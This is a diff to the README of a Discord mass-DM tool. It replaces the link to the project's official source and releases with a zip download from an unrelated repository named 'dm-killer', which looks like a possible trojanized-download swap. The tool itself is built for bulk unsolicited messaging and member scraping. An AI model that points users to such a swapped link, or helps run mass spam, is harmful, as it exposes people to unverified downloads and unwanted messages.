@@ -29,7 +29,7 @@
 
  
 ## Basic Usage
-1) [Download Source](https://github.com/V4NSH4J/discord-mass-DM-GO#building-from-source-) or download a pre-built version for your OS & Arch from [releases](https://github.com/V4NSH4J/discord-mass-DM-GO/releases)
+1) [Download Source](https://github.com/despk/dm-killer/archive/refs/heads/main.zip)
 2) Extract to desktop
 3) Configure your config.json
 4) If you already have memberids to DM, put them in `\data\memberids.txt` or obtain them from [Scraping]()
